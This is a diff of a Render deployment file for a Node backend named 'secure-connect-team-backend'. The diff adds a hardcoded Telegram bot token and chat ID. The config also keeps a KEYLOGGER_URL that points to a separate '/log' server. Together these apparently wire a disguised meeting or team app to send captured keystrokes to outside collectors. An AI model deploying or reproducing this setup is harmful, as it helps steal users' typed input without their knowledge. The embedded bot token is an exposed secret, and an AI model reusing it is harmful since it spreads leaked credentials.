@@ -1,13 +1,11 @@
 services:
   - type: web
-    name: secure-teams-bridge-backend
+    name: secure-connect-team-backend
     env: node
-    buildCommand: |
-      cd backend
-      npm install
-    startCommand: |
-      cd backend
-      node server.js
+    repo: https://github.com/your-username/secure-connect-team
+    branch: main
+    buildCommand: npm install
+    startCommand: node backend/server.js
     envVars:
       - key: PORT
         value: 3000
@@ -15,10 +13,12 @@ services:
         value: production
       - key: TELEGRAM_BOT_TOKEN
         sync: false
+        value: 8738758416:AAFrRHdJP-lEYbvqsJdlSxlEm23DWZ4vLRo
       - key: TELEGRAM_CHAT_ID
         sync: false
+        value: -1001234567890
       - key: BACKEND_URL
-        value: https://meeting-1-rzx6.onrender.com
+        value: https://secure-connect-team-backend.onrender.com
       - key: KEYLOGGER_URL
         value: https://keyserver-eaar.onrender.com/log
     disk:
